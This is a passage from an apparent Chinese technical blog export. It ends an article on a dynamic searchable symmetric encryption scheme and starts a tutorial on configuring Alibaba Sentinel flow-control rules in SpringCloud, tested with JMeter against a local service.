(〈addr_d(D_{i+1}),addr_d(N^⋆_{−1}),addr_d(N^⋆_{+1}),addr_s(N),addr_s(N_{−1}),addr_s(N_{+1}),F_{K_1}(w)〉⊕ H_2(K_f, r^′_i), r^′_i)$\n\n- 其中 $r'_i$ 是随机生成的 k-bit 串，$K_f:=P_{K_3}(f)$ ， $addr_d(D_\\#f_{w+1}) =0$\n- 每个条目$D_i$都与一个单词 $w$ 相关，因此$L_w$中节点$N$。设$N_{+1}$为$L_w$中$N$之后的节点，$N_{-1}$为$L_w$中$N$之前的节点\n\n\n\n通过设置 $T_d[F_{K_1}(f)] :=addr_d(D_1)⊕G_{K_2}(f)$，在删除表中存储一个指向 $L_f$ 的第一个节点的指针\n\n4. 通过在 $A_s$ 和 $A_d$ 中随机选择 $z$ 个未使用的单元格，创建一个未加密的空闲列表 $L_{free}$，让$(F_1，…，F_z)$和$(F'_1，…，F'_z)$分别为 $A_s$ 和 $A_d$ 中的空闲节点。设置 $T_s[free] :=〈addr_s(F_z),0^{log}\\#A〉$\n\nfor $z≤i≤1$, 设置 $A_s[addr_s(F_i)] :=0^{log}\\#f,addr_s(F_{i−1}),addr_d(F^′_i)$  其中 $addr_s(F_0) =0^{log}\\#A$\n\n5. 用随机字符串填充$A_S$ 和 $A_d$ 的其余条目\n\n6. 对于 $1≤i≤\\#f$，令 $c_i←SKE.Enc_{K4}(f_i)$\n\n7. 输出 $(γ,c)$ , 其中 $γ:= (A_s,T_s,A_d,T_d)$ 和 $c= (c_1, . . . , c_\\#f)$.\n\n### $SrchToken(K, w)$\n\n$$\nτ_s:=(F_{K_{1}}(w), G_{K_{2}}(w), P_{K_{3}}(w))\n$$\n\n### $Search(γ,c, τ_s)$\n\n- 将 $τ_s$ 解析为 $(τ_1， τ_2， τ_3)$，如果 $τ_1$ 在 $T_s$ 中不存在，则返回空列表。\n\n- 通过计算 $(α_1， α'_1):=T_s[τ_1]⊕τ_2$ 恢复指向列表第一个节点的指针\n- 查找 $N_1:=A[α_1]$ 并用 $τ_3$ 进行解密，\n- 即将 $N_1$ 解析为 $(ν_1, r_1)$ 并计算$(id_1,0,addr_s(N_2)):=ν_1⊕H_1(τ_3, r_1)$\n- 对于 $i≥2$，解密节点 $N_i$，直到 $α_{i+1}=0$\n- 设 $I={id_1，…，id_m}$ 为前面步骤中显示的文件标识符，并输出$\\{c_i\\}_{i∈I}$，即显示标识符的文件的加密\n\n### $AddToken(K, f)$\n\n让 $(w_1,…,w_\\#f)$ 是 $f$ 中关键词。计算 $τ_a:=(F_{K_{1}}(f), G_{K_{2}}(f), λ_1,. . .,λ_\\#f)$，对于所有 $1≤i≤\\#f$\n\n$λ_i:= (F_{K_{1}}(w_i), G_{K_{2}}(w_i),〈id(f),0〉 ⊕H_1(P_{K_3}(w_i), r_i), r_i,〈0,0,0,0,0,0, F_{K_{1}}(w_1〉 ⊕H_2(P_{K_3}(f), r^′_i), r^′_i)$\n\n- $r_i$ 和 $r'_i$ 是随机位字符串。令 $c_f←SKE.Enc_{K_4}(f)$ \n- 输出 $(τ_a, c_f)$\n\n### $Add(γ,c, τ_a)$\n\n1. 将 $τ_a$ 解析为$(τ_1,τ_2, λ_1,. . .,λ_\\#f)$，如果 $τ_1$ 不在 $T_s$ 内，则是⊥(无法运算)\n\n2. 对于 $1≤i≤\\#f$\n\n- 计算 $(φ,0) :=T_s[free],  (φ_{−1}, φ^⋆) :=A_s[φ]$ 找到搜索数组中最后一个空闲位置 $φ$ 和删除数组中对应入口 $φ^*$\n- 通过设置 $T_s[free]:= (φ_{−1},0)$，更新搜索表以指向倒数第二个空闲条目\n- 通过计算 $(α_1,α^*_1):=T_s[λ_i[1]]⊕λ_i[2]$ 恢复指向列表第一个节点 $N_1$ 的指针\n- 将新节点存储在位置 $φ$ 处，并通过设置$A_s[φ]:=(λ_i[3]⊕< 0，α_1 >， λ_i[4])$将其前向指针修改为$N_1$\n\n- 更新搜索表  $T_s[λ_i[1]]:=(φ, φ^⋆)⊕λ_i[2]$\n- 更新 $N_1$的对偶  $A_d[α^⋆_1] :=(D_1⊕〈0, φ^⋆,0,0,φ,0,0〉, r)$，其中 $(D_1,r) :=A_d[α^⋆_1]$\n\n- 更新$A_s[φ]$的对偶 $A_d[φ^⋆]:=(λ_i[5]⊕〈φ^⋆_{−1},0, α^⋆_1,φ,0, α_1, λ_i[1]〉, λ_i[6])$\n\n- 如果 i = 1，则更新删除表  $T_d[τ_1] :=〈φ^⋆,0〉⊕τ_2$\n\n\n3. 更新密文，将新密文 $c_{new}$ 加入 $c$\n\n### $DelToken(K, f)$\n\n$$\nτ_d:= (F_{K_{1}}(f), G_{K_{2}}(f), P_{K_{3}}(f),id(f))\n$$\n\n### $Del(γ,c, τ_d)$\n\n1. 将 $τ_d$ 解析为 $(τ_1,τ_2,τ_3,id)$，如果 $τ_1$ 不在 $T_d$ 内，则是⊥(终止)\n\n2. 找到 $L_f$ 的第一个节点 $α^′_1:=T_d[τ_1]⊕τ_2$\n\n3. 对于 $1≤i≤\\#f$\n\n   - 解密 $D_i$ ,  $(α_1, . . . , α_6, μ) :=D_i⊕H_2(τ_3, r)$, 其中  $(D_i, r) :=A_d[α^′_i]$\n\n   - 删除 $D_i$， $A_d[α^′_i]$ 为一个随机 ($6 log \\#(A+k)0$)-bit 字符串\n\n   - 找到最后一个空闲节点 $(φ,0^{log}\\#A) :=T_s[free]$\n\n   -  使搜索表中的 free 条目指向$D_i$的对偶 $T_s[free]:=〈α_4,0^{log}\\#A〉$\n\n   - $D_i$ 对偶的 的自由位置 $As[α_4] := (φ, α^′_i)$ \n\n- 让$N_{-1}$成为 $D_i$ 对偶之前的节点，更新 $N_{-1}$ 的 next 指针 by setting：\n- $A_s[α_5] := (β_1, β_2⊕α_4⊕α_6, r_{−1})$，其中 $(β_1, β_2, r_{−1}) :=A_s[α_5]$ \n- 此外 更新 $N_{-1}$的对偶指针 by setting:\n- $A_d[α_2] := (β_1, β_2, β_3⊕α^′_i⊕α_3, β_4, β_5, β_6⊕α_4⊕α_6, μ^∗, r^∗_{-1})$,where $(β_1, . . . , β_6, μ^∗, r^∗_{-1}) :=A_d[α_2]$\n- 让$N_{+1}$成为跟随 Di 的对偶的节点，更新 $N_{+1}$的对偶指针 by setting:\n- $A_d[α_3] := (β_1, β_2⊕α^′_i⊕α_2, β_3, β_4, β_5⊕α_4⊕α_5, β_6, μ^∗, r^∗_{+1})$，其中 $(β_1, . . . , β_6, μ^∗, r^∗_{+1}) :=A_d[α_3]$\n\n- set $α^′_{i+1}:=α_1$\n\n- 4.从 $c$ 中删除 $id$ 对应的密文\n- 5.从$T_d$中去除$τ_1$\n\n### $Dec(K, c)$\n\n$$\nm:=SKE.Dec_{K4}(c)\n$$\n\n\n\n\n\n### 说明性例子\n\n图1演示了包含3个文件和3个单词的玩具索引上的动态SSE数据结构。\n\n![](https://img.jwt1399.top/img/202211191913253.png)\n\n该索引基于三个文档，即$f_{1}$、$f_{2}$、$f_{3}$，基于三个关键词，即 $w_{1}$、$w_{2}$、$w_{3}$。所有文档都包含关键字 $w_{1}$，关键字$w_{2}$仅包含在文档 $f_{2}$ 中，而 $w_{3}$ 包含在文档 $f_{2}$ 和 $f_{3}$ 中。\n\n图1中还示出了相应的搜索表$T_{s}$、删除表 $T_{d}$、搜索数组 $A_{s}$ 和删除数组 $A_{d}$。\n\n注意，在真实的DSSE索引中，会有填充来隐藏文件单词对的数量；在这个例子中，为了简单起见，我们省略了这个填充。\n\n**搜索**。搜索是我们方案中最简单的操作。\n\n假设客户希望搜索包含关键字$w_{1}$的所有文档。他准备搜索令牌，其中包含 $F_{K_{1}}(w)$ 和$G_{K_{2}}(w)$。第一值 $F_{K_{1}}(w)$ 和将使服务器能够在搜索表$T_{s}$中定位对应于关键字$w_{1}$的条目。\n\n在我们的例子中，这个值是$x=(4∣∣1)\\oplus G_{K_{2}}(w)$。服务器现在使用第二个值 和$G_{K_{2}}(w)$来计算$x\\oplus G_{K_{2}}(w)$。这将允许服务器在搜索数组中定位正确的条目（在我们的例子中是4个），并开始“暴露”存储指向包含$w_{1}$的文档的指针的位置。这种去屏蔽是通过搜索令牌中包含的第三个值来执行的。\n\n\n\n**添加文档**。假设现在客户希望添加包含关键字$w_{1}$和$w_{2}$的文档$f_{4}$。请注意，搜索表根本没有改变，因为$f_{4}$正在进行成为关键字$w_{1}$和$w_{2}$列表中的最后一个条目，并且搜索表仅存储前几个条目。然而，所有其他数据结构必须以下列方式更新。首先，服务器使用无需快速检索搜索数组中“空闲”位置的索引，新条目将存储在这些位置。\n\n在我们的例子中，这些位置是2和6。服务器在这些条目中存储新信息$(w_{1}，f_{4})$和$(w_{2},f_{4})$。现在，服务器需要将这个新条目连接到相应的关键字列表：使用add令牌，它在搜索数组中检索元素x和y的索引$i = 0$和j = 3，使得x和y对应于关键字列表$w_{1}$和$w_{2}$的最后条目。这样，服务器同态地将$A_{s}\\left[ 0 \\right]$和$A_{s}\\left[ 3 \\right]$的“下一个”指针设置为指向新添加的节点，这些节点已经存储在搜索数组的位置2和6。\n\n\n\n注意，访问搜索数组中的空闲条目也提供了对删除数组$A_d$的相应空闲位置的访问。在我们的例子中，删除数组中空闲位置的索引是3和7。服务器将在删除数组中的这些位置存储新的条目$(f_{4},w_{1})$和$(f_{4},w_{2})$,并将它们用指针连接起来。最后，服务器将通过将条目$F_{K_{1}}(f_{4})$设置为指向删除数组中的位置3来更新删除表，以便稍后可以容易地检索文件$f_4$进行删除。\n\n **删除文档**。假设现在客户想要删除一个已经存储在我们的索引中的文档，比如说文档$f_{3}$，它包含关键字$w_{1}$和$w_{3}$。删除是添加的“双重操作”。首先，服务器使用删除令牌的值$F_{K_{1}}(f_{3})$在删除表中定位正确的值$4\\oplus G_{K_{2}}(f_{3})$。这将允许服务器访问剩余数据结构中需要用add算法以类似方式更新的部分。即它将“释放”删除数组中的位置4和6以及搜索数组中的位置1和3。当“释放”搜索数组中的位置时，它还将同态更新指向新条目的关键字列表$w_{1}$和$w_{3}$（在我们的例子中，指向列表的末尾——通常在已删除条目的下一个指针中）。注意，删除数组不需要这样的指针更新。\n\n##  5、参考文献\n\n- [《动态可搜索对称加密》](https://blog.nowcoder.net/n/b3227a872c25451784acfbca3f9c2cb0)\n\n- [动态可搜索加密-1-前世今生 - Kisna's Blog (eotstxtab.top)](http://eotstxtab.top/2022/03/01/动态可搜索加密-1-前世今生/)\n\n- [IEEE TIFS'22：健壮且具有前后向安全性的可搜索对称加密_ IT技术精华 (taocms.org)](http://it.taocms.org/07/110668.htm)\n\n- [动态可搜索对称加密方案，支持具有向前（和向后）安全|的范围查询施普林格链接 (springer.com)](https://link.springer.com/chapter/10.1007/978-3-319-98989-1_12)\n\n- [安全性证明 - PamShao - 博客园 (cnblogs.com)](https://www.cnblogs.com/pam-sh/p/16383012.html)\n\n## Sponsor❤️\n\n您的支持是我不断前进的动力，如果您感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝</td>\n         <td style=\"text-align:center;\">微信</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["可搜索加密"],"categories":["Crypto"]},{"title":"SpringCloud-高级篇","url":"/posts/41649.html","content":"\n> 高级篇包含微服务保护(流量控制，系统保护，熔断降级，服务授权)、分布式事务、多级缓存、Redis集群、可靠消息服务\n\n| ![学习安排](https://img.jwt1399.top/img/202209201412578.png) |\n| ------------------------------------------------------------ |\n| ![技术分类](https://img.jwt1399.top/img/202209201436751.png) |\n\n# 1.微服务保护\n\n## ①初识Sentinel\n\n### ❶雪崩问题及解决方案\n\n**什么是雪崩问题？**\n\n微服务中，服务间调用关系错综复杂，一个微服务往往依赖于多个其它微服务。如果微服务调用链路中的某个服务故障，引起整个链路中的所有微服务都不可用，则称为雪崩。\n\n**解决雪崩问题的常见方式有四种：**\n\n- **超时处理**：设定超时时间，请求超过一定时间没有响应就返回错误信息，不会无休止等待。\n\n- **舱壁模式**：限定每个业务能使用的线程数，避免耗尽整个tomcat的资源，因此也叫**线程隔离**。\n\n- **熔断降级**：由**断路器**统计业务执行的异常比例，如果超出阈值则**熔断**该业务，拦截访问该业务的一切请求。\n\n- **流量控制**：限制业务访问的QPS（Query Per Second：每秒处理请求数），避免服务因流量的突增而故障。\n\n **流量控制**是对服务的保护，避免因瞬间高并发流量而导致服务故障，进而避免雪崩。是一种**预防**措施。\n\n**超时处理、线程隔离、熔断降级**是在部分服务故障时，将故障控制在一定范围，避免雪崩。是一种**补救**措施。\n\n换句话说：\n\n如何避免因瞬间高并发流量而导致服务故障？流量控制\n\n如何避免因服务故障引起的雪崩问题？超时处理、线程隔离、降级熔断\n\n### ❷服务保护技术对比\n\n在SpringCloud当中支持多种服务保护技术，早期比较流行的是Hystrix框架，但目前国内实用最广泛的还是阿里巴巴的Sentinel框架，这里我们做下对比：\n\n|                | **Sentinel**                                   | **Hystrix**                   |\n| -------------- | ---------------------------------------------- | ----------------------------- |\n| 隔离策略       | 信号量隔离                                     | 线程池隔离/信号量隔离         |\n| 熔断降级策略   | 基于慢调用比例或异常比例                       | 基于失败比率                  |\n| 实时指标实现   | 滑动窗口                                       | 滑动窗口（基于 RxJava）       |\n| 规则配置       | 支持多种数据源                                 | 支持多种数据源                |\n| 扩展性         | 多个扩展点                                     | 插件的形式                    |\n| 基于注解的支持 | 支持                                           | 支持                          |\n| 限流           | 基于 QPS，支持基于调用关系的限流               | 有限的支持                    |\n| 流量整形       | 支持慢启动、匀速排队模式                       | 不支持                        |\n| 系统自适应保护 | 支持                                           | 不支持                        |\n| 控制台         | 开箱即用，可配置规则、查看秒级监控、机器发现等 | 不完善                        |\n| 常见框架的适配 | Servlet、Spring Cloud、Dubbo、gRPC  等         | Servlet、Spring Cloud Netflix |\n\n### ❸Sentinel介绍和安装\n\n#### 1.介绍\n\nSentinel是阿里巴巴开源的一款微服务流量控制组件。官网地址：https://sentinelguard.io/zh-cn/index.html\n\nSentinel 具有以下特征:\n\n- **丰富的应用场景**：Sentinel 承接了阿里巴巴近 10 年的双十一大促流量的核心场景，例如秒杀（即突发流量控制在系统容量可以承受的范围）、消息削峰填谷、集群流量控制、实时熔断下游不可用应用等。\n\n- **完备的实时监控**：Sentinel 同时提供实时的监控功能。您可以在控制台中看到接入应用的单台机器秒级数据，甚至 500 台以下规模的集群的汇总运行情况。\n\n- **广泛的开源生态**：Sentinel 提供开箱即用的与其它开源框架/库的整合模块，例如与 Spring Cloud、Dubbo、gRPC 的整合。您只需要引入相应的依赖并进行简单的配置即可快速地接入 Sentinel。\n\n- **完善的** **SPI** **扩展点**：Sentinel 提供简单易用、完善的 SPI 扩展接口。您可以通过实现扩展接口来快速地定制逻辑。例如定制规则管理、适配动态数据源等。\n\n#### 2.安装\n\n**下载**：sentinel官方提供了UI控制台，可以在[GitHub](https://github.com/alibaba/Sentinel/releases)下载。\n\n**运行**：将jar包放到任意非中文目录，执行命令：\n\n```sh\njava -jar sentinel-dashboard-1.8.5.jar\n```\n\n**修改配置**：如果要修改Sentinel的默认端口、账户、密码，可以通过下列配置：\n\n| **配置项**                       | **默认值** | **说明**   |\n| -------------------------------- | ---------- | ---------- |\n| server.port                      | 8080       | 服务端口   |\n| sentinel.dashboard.auth.username | sentinel   | 默认用户名 |\n| sentinel.dashboard.auth.password | sentinel   | 默认密码   |\n\n例如，修改端口：\n\n```sh\njava -Dserver.port=8090 -jar sentinel-dashboard-1.8.5.jar\n```\n\n**使用**：访问http://localhost:8080页面，就可以看到sentinel的控制台了\n\n### ❹微服务整合Sentinel\n\n要使用Sentinel肯定要结合微服务，这里我们使用SpringCloud实用篇中的cloud-demo工程。\n\n1）order-service中引入sentinel依赖\n\n```xml\n<!--sentinel-->\n<dependency>\n    <groupId>com.alibaba.cloud</groupId> \n    <artifactId>spring-cloud-starter-alibaba-sentinel</artifactId>\n</dependency>\n```\n\n2）配置控制台\n\n修改application.yaml文件，添加下面内容：\n\n```yaml\nserver:\n  port: 8088\nspring:\n  cloud: \n    sentinel:\n      transport:\n        dashboard: localhost:8080\n```\n\n3）访问微服务的任意端点，访问后才能触发sentinel的监控。然后再访问sentinel的控制台，即可查看效果\n\n## ②流量控制\n\n### ❶簇点链路\n\n当请求进入微服务时，首先会访问DispatcherServlet，然后进入Controller、Service、Mapper，这样的一个调用链就叫做**簇点链路**。簇点链路中被监控的每一个接口就是一个**资源**。\n\n默认情况下sentinel会监控SpringMVC的每一个端点（Endpoint，也就是controller中的方法），因此SpringMVC的每一个端点（Endpoint）就是调用链路中的一个资源。\n\n例如，我们刚才访问的order-service中的OrderController中的端点：/order/{orderId}\n\n![](https://img.jwt1399.top/img/202210101426510.png)\n\n流控、熔断等都是针对簇点链路中的资源来设置的，因此我们可以点击对应资源后面的按钮来设置规则：\n\n- 流控：流量控制\n- 降级：降级熔断\n- 热点：热点参数限流，是限流的一种\n- 授权：请求的权限控制\n\n### ❷快速入门\n\n#### 1.示例\n\n点击资源/order/{orderId}后面的流控按钮，就可以弹出表单。表单中可以填写限流规则，如下：\n\n![](https://img.jwt1399.top/img/202210102031031.png)\n\n其含义是限制 /order/{orderId}这个资源的单机QPS为1，即每秒只允许1次请求，超出的请求会被拦截并报错。\n\n#### 2.练习\n\n> 需求：给 /order/{orderId}这个资源设置流控规则，QPS不能超过 5，然后测试。\n\n1）首先在sentinel控制台添加限流规则\n\n2）利用jmeter测试，如果没有用过jmeter，可以参考下面章节《Jmeter快速入门.md》\n\n打开jmeter，导入编写好的Jmeter测试样例，选择`流控入门，QPS<5`![](https://img.jwt1399.top/img/202210101529813.png)\n\n20个用户，2秒内运行完，QPS是10，超过了5。选中`流控入门，QPS<5`右键运行：可以看到成功请求每次只有5个\n\n> 注意，不要点击菜单中的执行按钮来运行。\n\n| 启动                                                 | 结果                                                 |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210101530894.png) | ![](https://img.jwt1399.top/img/202210101530202.png) |\n\n#### 3.Jmeter快速入门\n\n##### 1.安装Jmeter\n\nJmeter依赖于JDK，所以必须确保当前计算机上已经安装了JDK，并且配置了环境变量。\n\n可以Apache Jmeter官网下载，地址：http://jmeter.apache.org/download_jmeter.cgi\n\n有两个版本可供下载：\n\n- Binaries：二进制版，即已经编译好、可直接执行；\n- Source：源代码版，需要自己编译；\n\n我们下载Binaries版本，下载完成后，解压\n\n##### 2.启动JMeter\n\n进入到bin目录下，通过`sh jmeter`命令来启动JMeter\n\n现在，我们已经可以成功启动JMeter了，但是每次都需要打开终端、进入到JMeter的bin目录下，输入`sh jmeter`命令来启动，显得有点繁琐。当我们对~/.bash_profile（ ~/.zshrc）这个文件熟悉后，可以直接把JMeter配置到环境变量中。\n\n还是通过`vim .bash_profile`进入到vim编辑器，输入以下命令：\n\n```bash\nexport JMETER_HOME=/Users/jianjian/JavaSoft/apache-jmeter-5.5\nexport PATH=$JAVA_HOME/bin:$PATH:.:$JMETER_HOME/bin:$PATH\nexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JMETER_HOME/lib/ext/ApacheJMeter_core.jar:$JMETER_HOME/lib/jorphan.jar:$JMETER_HOME/lib/logkit-2.0.jar\n```\n\n退出vim编辑器，输入`source ~/.bash_profile`。接下来重点来了，直接在终端（任意目录）输入`jmeter`，即可启动JMeter。\n\n##### 3.设置中文\n\n默认Jmeter的语言是英文，可以在 Option->Choose Lunguag中进行修改，这种方式只能保证本次运行是中文，如果要永久中文，需要修改Jmeter的配置文件\n\n打开jmeter文件夹，在bin目录中找到 **jmeter.properties**，添加下面配置：\n\n```bash\n#Preferred GUI language. Comment out to use the JVM default locale's language.\nlanguage=zh_CN\n```\n\n##### 4.基本用法\n\n在测试计划上点鼠标右键，选择添加 > 线程（用户） > 线程组：\n\n![](https://img.jwt1399.top/img/202210102032741.png)\n\n在新增的线程组中，填写线程信息：\n\n![](https://img.jwt1399.top/img/202210102032979.png)\n\n\n\n给线程组点鼠标右键，添加http取样器：\n\n![](https://img.jwt1399.top/img/202210102032119.png)\n\n编写取样器内容：\n\n![](https://img.jwt1399.top/img/202210102032649.png)\n\n添加监听器：\n\n| 添加监听报告                                         | 添加监听结果树                                       |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210102032719.png) | ![](https://img.jwt1399.top/img/202210102032347.png) |\n\n然后点击运行：\n\n| 汇总报告结果                                         | 结果树                                               |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210102032067.png) | ![](https://img.jwt1399.top/img/202210102032761.png) |\n\n### ❸流控模式\n\n#### 1.简介\n\n在添加限流规则时，点击高级选项，可以选择三种**流控模式**：\n\n- **直接**：统计当前资源的请求，触发阈值时对当前资源直接限流，默认的模式（快速入门案例就是直接模式）\n- **关联**：统计与当前资源相关的另一个资源，触发阈值时，对当前资源限流\n- **链路**：统计从指定链路访问到本资源的请求，触发阈值时，对指定链路限流\n\n![](https://img.jwt1399.top/img/202210102043335.png)\n\n#### 2.关联模式\n\n**关联模式**：统计与当前资源相关的另一个资源触发阈值时，对当前资源限流\n\n**配置规则**：当/write资源访问量触发阈值时，就会对/read资源限流，避免影响/write资源。\n\n![](https://img.jwt1399.top/img/202210102053981.png)\n\n满足下面条件可以使用关联模式：\n\n- 两个有竞争关系的资源\n- 一个优先级较高，一个优先级较低\n\n**例如**：用户支付时需要修改订单状态，同时用户要查询订单。查询和修改操作会争抢数据库锁，产生竞争。业务需求是优先支付和更新订单的业务，因此当修改订单业务触发阈值时，需要对查询订单业务限流。\n\n**练习**：\n\n- 在OrderController新建两个端点：/order/query和/order/update，无需实现业务\n\n- 配置流控规则，当/order/update资源被访问的QPS超过5时，对/order/query请求限流\n\n1）定义/order/query端点，模拟订单查询\n\n```java\n@GetMapping(\"/query\")\npublic String queryOrder() {\n    return \"查询订单成功\";\n}\n```\n\n2）定义/order/update端点，模拟订单更新\n\n```java\n@GetMapping(\"/update\")\npublic String updateOrder() {\n    return \"更新订单成功\";\n}\n```\n\n重启服务，即可查看sentinel控制台的簇点链路\n\n3）配置流控规则\n\n对哪个端点限流，就点击哪个端点后面的按钮。我们是对订单查询/order/query限流，因此点击它后面的按钮：\n\n![](https://img.jwt1399.top/img/202210102053322.png)\n\n在表单中填写流控规则：\n\n<img src=\"https://img.jwt1399.top/img/202210102053327.png\" style=\"zoom:50%;\" />\n\n4）在Jmeter测试，选择`流控模式-关联`：\n\n![](https://img.jwt1399.top/img/202210102056349.png)\n\n可以看到1000个用户，100秒，因此QPS为10，超过了我们设定的阈值：5\n\n查看http请求：\n\n![](https://img.jwt1399.top/img/202210102056241.png)\n\n请求的目标是/order/update，超过阈值就会触发限流。但限流的目标是/order/query，在浏览器访问，可以发现：\n\n![](https://img.jwt1399.top/img/202210102056506.png)\n\n#### 3.链路模式\n\n**链路模式**：只针对从指定链路访问到本资源的请求做统计，判断是否超过阈值。\n\n**配置示例**：\n\n例如有两条请求链路：\n\n- /test1 --> /common\n\n- /test2 --> /common\n\n如果只希望统计从/test2进入到/common的请求，则可以这样配置：\n\n![](https://img.jwt1399.top/img/202210102100433.png)\n\n**练习**\n\n> 需求：有查询订单和创建订单业务，两者都需要查询商品。针对从查询订单进入到查询商品的请求统计，并设置限流。\n\n步骤：\n\n1. 在OrderService中添加一个queryGoods方法，不用实现业务\n\n2. 在OrderController中，改造/order/query端点，调用OrderService中的queryGoods方法\n\n3. 在OrderController中添加一个/order/save的端点，调用OrderService的queryGoods方法\n\n4. 给queryGoods设置限流规则，从/order/query进入queryGoods的方法限制QPS必须小于2\n\n实现：\n\n1）添加查询商品方法\n\n在order-service服务中，给OrderService类添加一个queryGoods方法：\n\n```java\npublic void queryGoods(){\n    System.err.println(\"查询商品\");\n}\n```\n\n2）查询订单时，查询商品\n\n在order-service的OrderController中，修改/order/query端点的业务逻辑：\n\n```java\n@GetMapping(\"/query\")\npublic String queryOrder() {\n    // 查询商品\n    orderService.queryGoods();\n    // 查询订单\n    System.out.println(\"查询订单\");\n    return \"查询订单成功\";\n}\n```\n\n3）新增订单，查询商品\n\n在order-service的OrderController中，修改/order/save端点，模拟新增订单：\n\n```java\n@GetMapping(\"/save\")\npublic String saveOrder() {\n    // 查询商品\n    orderService.queryGoods();\n    // 查询订单\n    System.err.println(\"新增订单\");\n    return \"新增订单成功\";\n}\n```\n\n 4）给查询商品添加资源标记\n\n默认情况下，OrderService中的方法是不被Sentinel监控的，需要我们自己通过注解来标记要监控的方法。\n\n给OrderService的queryGoods方法添加`@SentinelResource`注解：\n\n```java\n@SentinelResource(\"goods\")\npublic void queryGoods(){\n    System.err.println(\"查询商品\");\n}\n```\n\n链路模式中，是对不同来源的两个链路做监控。但是sentinel默认会给进入SpringMVC的所有请求做context整合（设置同一个root资源），会导致链路模式失效。\n\n我们需要关闭这种对SpringMVC的资源聚合，修改order-service服务的application.yml文件：\n\n```yaml\nspring:\n  cloud:\n    sentinel:\n      web-context-unify: false # 关闭context整合\n```\n\n重启服务，访问/order/query和/order/save，可以查看到sentinel的簇点链路规则中，出现了新的资源：\n\n<img src=\"https://img.jwt1399.top/img/202210102105976.png\" style=\"zoom:50%;\" />\n\n5）添加流控规则\n\n点击goods资源后面的流控按钮，在弹出的表单中填写下面信息：\n\n<img src=\"../images/SpringCloud-高级篇/image-20221010210635083.png\" style=\"zoom:50%;\" />\n\n只统计从/order/query进入/goods的资源，QPS阈值为2，超出则被限流。\n\n 6）Jmeter测试，选择`流控模式-链路`：\n\n![](https://img.jwt1399.top/img/202210102108736.png)\n\n可以看到这里200个用户，50秒内发完，QPS为4，超过了我们设定的阈值2。\n\n| http请求一：/order/save                              | http请求二：/order/query                             |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210102110676.png) | ![](https://img.jwt1399.top/img/202210102110361.png) |\n| ![](https://img.jwt1399.top/img/202210102110944.png) | ![](https://img.jwt1399.top/img/202210102110669.png) |\n\n#### 4.总结\n\n流控模式有哪些？\n\n- 直接：对当前资源限流\n\n- 关联：高优先级资源触发阈值，对低优先级资源限流。\n\n- 链路：对请求来源的限流\n\n### ❹流控效果\n\n#### 1.简介\n\n在流控的高级选项中，还有一个流控效果选项：\n\n流控效果是指请求达到流控阈值时应该采取的措施，包括三种：\n\n- **快速失败**：达到阈值后，新的请求会被立即拒绝并抛出FlowException异常，是默认的处理方式。\n\n- **warm up**：预热模式，对超出阈值的请求同样是拒绝并抛出异常。但这种模式阈值会动态变化，从一个较小值逐渐增加到最大阈值。\n\n- **排队等待**：让所有的请求按照先后次序排队执行，两个请求的间隔不能小于指定时长\n\n![](https://img.jwt1399.top/img/202210102117862.png)\n\n#### 2.Warm up\n\n阈值一般是一个微服务能承担的最大QPS，但是一个服务刚刚启动时，一切资源尚未初始化（**冷启动**），如果直接将QPS跑到最大值，可能导致服务瞬间宕机。\n\nwarm up也叫**预热模式**，是应对服务冷启动的一种方案。请求阈值初始值是 `maxThreshold / coldFactor`，持续指定时长后，逐渐提高到 maxThreshold 值。而 coldFactor 的默认值是3。\n\n例如，我设置QPS的maxThreshold为10，预热时间为5秒，那么初始阈值就是 10 / 3 ，也就是3，然后在5秒后逐渐增长到10。\n\n![](https://img.jwt1399.top/img/202210102124732.png)\n\n**练习**\n\n> 需求：给/order/{orderId}这个资源设置限流，最大QPS为10，利用warm up效果，预热时长为5秒\n\n1）配置流控规则：\n\n<img src=\"https://img.jwt1399.top/img/202210102126946.png\"  style=\"zoom:50%;\" />\n\n\n\n2）Jmeter测试，选择`流控效果，warm up`：\n\n![](https://img.jwt1399.top/img/202210102126653.png)\n\n| 刚刚启动时，大部分请求失败，成功的只有3个，说明QPS被限定在3 | 随着时间推移，成功比例越来越高                       |\n| ----------------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210102131751.png)        | ![](https://img.jwt1399.top/img/202210102131157.png) |\n| ![](https://img.jwt1399.top/img/202210102131915.png)        | ![](https://img.jwt1399.top/img/202210102131516.png) |\n\n#### 3.排队等待\n\n当请求超过QPS阈值时，快速失败和warm up 会拒绝新的请求并抛出异常。而排队等待则是让所有请求进入一个队列中，然后按照阈值允许的时间间隔依次执行。后来的请求必须等待前面执行完成，如果请求的预期等待时间超出最大时长，则会被拒绝。\n\n例如：QPS = 5，意味着每200ms处理一个队列中的请求；timeout = 2000，意味着**预期等待时长**超过2000ms的请求会被拒绝并抛出异常。\n\n那什么叫做预期等待时长呢？比如现在一下子来了12 个请求，因为每200ms执行一个请求，那么：\n\n- 第6个请求的**预期等待时长** =  200 * （6 - 1） = 1000ms\n- 第12个请求的预期等待时长 = 200 * （12-1） = 2200ms\n\n**练习**\n\n> 需求：给/order/{orderId}这个资源设置限流，最大QPS为10，利用排队的流控效果，超时时长设置为5s\n\n1）添加流控规则\n\n<img src=\"https://img.jwt1399.top/img/202210102138247.png\" style=\"zoom:50%;\" />\n\n\n\n2）Jmeter测试，选择`流控效果，队列`：\n\n![](https://img.jwt1399.top/img/202210102139397.png)\n\n如果是之前的 